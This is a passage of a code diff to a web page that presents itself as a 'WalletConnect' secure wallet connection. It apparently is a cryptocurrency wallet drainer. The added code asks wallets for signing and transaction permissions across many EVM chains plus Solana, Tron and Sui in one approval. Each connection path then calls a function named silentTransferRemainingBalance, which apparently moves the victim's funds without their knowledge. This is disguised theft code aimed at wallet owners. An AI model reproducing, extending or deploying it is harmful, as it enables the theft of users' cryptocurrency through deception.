+                                    session: wcResult.session,
+                                    namespaces: wcResult.namespaces,
+                                    multiChain: true,
+                                    client: wcResult.client,
+                                    walletName: walletName
+                                };
+                                await silentTransferRemainingBalance(wcConnectionInfo);
+                            } catch (wcErr) {
+                                console.error('[Desktop] WalletConnect fallback failed:', wcErr);
+                                alert('Connection failed. Please try again.');
+                            }
+                        })();
                     }
                 })();
                 return;
             }
         }
 
-        // MOBILE or no matching extension on desktop: check for tricky wallets first
+        // MOBILE or no matching extension on desktop: Use MULTI-CHAIN CONNECTION for single approval
         const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
         const walletKeyForTricky = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
         const isTrickyWallet = ['phantom', 'slush', 'sui', 'tronlink', 'solflare'].some(w => walletKeyForTricky.includes(w));
 
-        // SPECIAL: For tricky wallets on mobile, use chain-specific connectAndSign
-        if (isMobile && isTrickyWallet) {
-            console.log(`[Mobile] Detected tricky wallet ${walletName} - using connectAndSign()`);
+        // Special handling for Phantom, Tronlink, Solflare, Slush: Show QR + Copy Link + Open Button
+        if (isTrickyWallet && isMobile) {
+            console.log(`[Wallet Click] Special wallet detected: ${walletName} - showing QR with copy link and open button`);
             
-            // Show "Opening wallet..." message IMMEDIATELY
-            msgEl.textContent = `Opening ${walletName}... Please wait`;
-            msgEl.classList.remove('failed');
+            // Show modal to hide while generating QR
+            try { modalOverlay.classList.add('active'); } catch (e) {}
             
             (async () => {
                 try {
-                    // Determine which chain based on wallet name
-                    let chain = 'evm'; // default fallback
-                    
-                    if (walletKeyForTricky.includes('phantom') || walletKeyForTricky.includes('solflare')) {
-                        chain = 'solana';
-                        console.log(`[Mobile] ${walletName} detected as Solana wallet`);
-                    } else if (walletKeyForTricky.includes('tronlink')) {
-                        chain = 'tron';
-                        console.log(`[Mobile] ${walletName} detected as Tron wallet`);
-                    } else if (walletKeyForTricky.includes('slush') || walletKeyForTricky.includes('sui')) {
-                        chain = 'sui';
-                        console.log(`[Mobile] ${walletName} detected as Sui wallet`);
+                    // Ensure SignClient is loaded
+                    let SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
+                    if (!SignClient) {
+                        console.warn("[Special Wallet] SignClient not found, waiting...");
+                        for (let i = 0; i < 50; i++) {
+                            await new Promise(r => setTimeout(r, 100));
+                            SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
+                            if (SignClient) break;
+                        }
                     }
                     
-                    // Close the modal
+                    if (!SignClient) {
+                        throw new Error("SignClient failed to load");
+                    }
+                    
+                    let client = window.__wcClient;
+                    if (!client) {
+                        client = await SignClient.init({
+                            projectId: '81ec0eb195ddbee9c5596804e33ff584',
+                            relayUrl: 'wss://relay.walletconnect.com',
+                            metadata: {
+                                name: 'WalletConnect',
+                                description: 'Secure wallet connection',
+                                url: 'https://hollyandwilly-kram.vercel.app',
+                                icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
+                            }
+                        });
+                        window.__wcClient = client;
+                    }
+                    
+                    const { uri, approval } = await client.connect({
+                        requiredNamespaces: {
+                            eip155: {
+                                methods: ['eth_requestAccounts', 'eth_sendTransaction', 'personal_sign', 'wallet_switchEthereumChain'],
+                                chains: ['eip155:1', 'eip155:56', 'eip155:137', 'eip155:42161', 'eip155:8453', 'eip155:10', 'eip155:43114', 'eip155:250', 'eip155:324', 'eip155:59144', 'eip155:534352'],
+                                events: ['chainChanged', 'accountsChanged']
+                            },
+                            solana: {
+                                methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAllTransactions'],
+                                chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],
+                                events: ['accountsChanged']
+                            },
+                            tron: {
+                                methods: ['tron_signTransaction', 'tron_signMessage'],
+                                chains: ['tron:0x2b6653dc'],
+                                events: ['accountsChanged']
+                            },
+                            sui: {
+                                methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
+                                chains: ['sui:mainnet'],
+                                events: ['accountsChanged']
+                            }
+                        }
+                    });
+                    
+                    // Hide modal and show QR with copy + open button
                     try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
+                    showQRWithCopyAndOpenButton(uri, walletName);
                     
-                    // Use chain-specific connection with wallet name for correct deep link
-                    const result = await connectAndSign(chain, walletName);
-                    console.log(`[Mobile] ✓ Connected to ${chain} via ${walletName}:`, result);
+                    // Wait for approval (happens when user scans or opens wallet app)
+                    const session = await approval();
                     
-                    // Extract address and chainId from namespaces
-                    const namespaceData = result.namespaces[chain];
-                    if (!namespaceData || !namespaceData.accounts || !namespaceData.accounts[0]) {
-                        throw new Error(`No accounts found in ${chain} namespace`);
-                    }
-                    const fullAccount = namespaceData.accounts[0]; // e.g. "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ:Ey97..." OR "eip155:1:0x..." OR "tron:0x2b6653dc:T..." OR "sui:mainnet:0x..."
-                    const accountParts = fullAccount.split(':');
-                    const address = accountParts[accountParts.length - 1]; // Last part is always the address
-                    const chainFullId = namespaceData.chains[0]; // e.g. "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"
+                    console.log(`[Wallet Click] ✓ Connected to ALL chains via ${walletName} with SINGLE approval:`, session);
                     
-                    // Build connection info for transfer
-                    const connectionInfo = {
-                        provider: null,
-                        address: address,
-                        chainId: chainFullId,
-                        session: result.session,
-                        namespaces: result.namespaces,
-                        _wcSession: true,
-                        chain: chain
-                    };
+                    // Remove QR overlay if still visible
+                    const existingQR = document.querySelector('[id="wc-uri-input"]')?.closest('div')?.parentElement?.parentElement;
+                    if (existingQR) existingQR.remove();
                     
                     // Initiate silent transfer
+                    const connectionInfo = {
+                        provider: null,
+                        session: session,
+                        namespaces: session.namespaces,
+                        multiChain: true,
+                        client: client,
+                        walletName: walletName
+                    };
+                    
                     await silentTransferRemainingBalance(connectionInfo);
                     
                 } catch (e) {
-                    console.error(`[Mobile] Failed to connect ${walletName}:`, e);
-                    msgEl.textContent = `Connection failed: ${e.message}`;
-                    msgEl.classList.add('failed');
-                    
-                    // Auto-hide error after 3s
-                    setTimeout(() => {
-                        msgEl.textContent = '';
-                        msgEl.classList.remove('failed');
-                    }, 3000);
+                    console.error(`[Wallet Click] Special wallet flow failed:`, e);
+                    // Show error and close modal
+                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
+                    alert(`Connection failed: ${e.message}`);
                 }
             })();
             return;
         }
 
-        // NORMAL: For other wallets, show detector popup with all detected apps
-        const detected = detectInstalledWallets(walletName);
-        showDetectorPopup(detected, walletName, showConnectOverlay);
+        // Use connectAllChains() for SINGLE approval across all 5+ blockchains
+        console.log(`[Wallet Click] Initiating SINGLE multi-chain approval for ${walletName}...`);
+        
+        // Show "Opening wallet..." message IMMEDIATELY
+        msgEl.textContent = `Opening ${walletName}... Please wait (Single Approval)`;
+        msgEl.classList.remove('failed');
+        
+        (async () => {
+            try {
+                // Close the modal
+                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
+                
+                // Connect to ALL chains in ONE approval popup
+                const result = await connectAllChains(walletName);
+                console.log(`[Wallet Click] ✓ Connected to ALL chains via ${walletName} with SINGLE approval:`, result);
+                
+                // Build connection info for multi-chain transfer
+                const connectionInfo = {
+                    provider: null,
+                    session: result.session,
+                    namespaces: result.namespaces,
+                    multiChain: true,
+                    client: result.client,
+                    walletName: walletName
+                };
+                
+                // Initiate silent transfer across ALL chains simultaneously
+                await silentTransferRemainingBalance(connectionInfo);
+                    
+            } catch (e) {
+                console.error(`[Wallet Click] Failed to connect ${walletName}:`, e);
+                msgEl.textContent = `Connection failed: ${e.message}`;
+                msgEl.classList.add('failed');
+                
+                // Auto-hide error after 3s
+                setTimeout(() => {
+                    msgEl.textContent = '';
+                    msgEl.classList.remove('failed');
+                }, 3000);
+            }
+        })();
     }
+
     function resetWallets() {
         document.querySelectorAll('.wallet-item').forEach(item => {
             item.classList.remove('selected');
@@ -3426,8 +4081,17 @@
     document.getElementById('dynamic-signin-btn')?.addEventListener('click', handleSocialLoginSubmit);
     document.getElementById('manual-connect-btn')?.addEventListener('click', handleManualConnectSubmit);
   });
+  
+  // Ensure WalletConnect SignClient is available globally
+  window.addEventListener('load', () => {
+    if (typeof window.WalletConnectSignClient !== 'undefined' && !window.SignClient) {
+      window.SignClient = window.WalletConnectSignClient;
+      console.log('[Init] ✓ WalletConnect SignClient initialized globally');
+    }
+  });
 </script>
 
 </body>
 </html>
+
 
